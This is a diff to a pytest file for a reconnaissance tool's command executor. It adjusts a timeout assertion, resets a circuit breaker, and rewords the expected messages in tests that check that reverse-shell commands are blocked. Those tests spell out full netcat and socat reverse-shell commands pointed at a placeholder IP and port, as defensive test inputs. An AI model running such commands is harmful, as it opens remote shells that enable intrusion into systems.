@@ -40,7 +40,7 @@ def test_run_uses_tool_class_default_timeout(monkeypatch: pytest.MonkeyPatch) ->
     monkeypatch.setattr(subprocess, "run", fake_run)
     executor = CommandExecutor(DummyLogger())
     executor.run(["httpx", "-version"], check=False, capture_output=True)
-    assert seen["timeout"] == 150
+    assert seen["timeout"] == 300
 
 
 def test_run_retries_on_timeout(monkeypatch: pytest.MonkeyPatch) -> None:
@@ -62,6 +62,10 @@ def test_run_retries_on_timeout(monkeypatch: pytest.MonkeyPatch) -> None:
     assert calls["count"] == 2
 
 def test_circuit_breaker_blocks_after_threshold(monkeypatch: pytest.MonkeyPatch) -> None:
+    from recon_cli.utils.circuit_breaker import registry as circuit_registry
+    if "executor:scanner" in circuit_registry._breakers:
+        del circuit_registry._breakers["executor:scanner"]
+
     calls = {"count": 0}
 
     def fake_run(cmd, **kwargs):
@@ -185,7 +189,7 @@ def test_run_blocks_nc_reverse_shell_exec(monkeypatch: pytest.MonkeyPatch) -> No
 
     monkeypatch.setattr(subprocess, "run", fake_run)
     executor = CommandExecutor(DummyLogger())
-    with pytest.raises(CommandError, match="reverse-shell style execution payload"):
+    with pytest.raises(CommandError, match="Blocked potential reverse shell via nc"):
         executor.run(["nc", "10.2.3.4", "4444", "-e", "/bin/sh"], check=False)
     assert called["count"] == 0
 
@@ -199,7 +203,7 @@ def test_run_blocks_socat_reverse_shell_exec(monkeypatch: pytest.MonkeyPatch) ->
 
     monkeypatch.setattr(subprocess, "run", fake_run)
     executor = CommandExecutor(DummyLogger())
-    with pytest.raises(CommandError, match="socat potential reverse-shell execution payload"):
+    with pytest.raises(CommandError, match="Blocked potential reverse shell via socat"):
         executor.run(["socat", "TCP:10.2.3.4:4444", "EXEC:/bin/sh"], check=False)
     assert called["count"] == 0
 
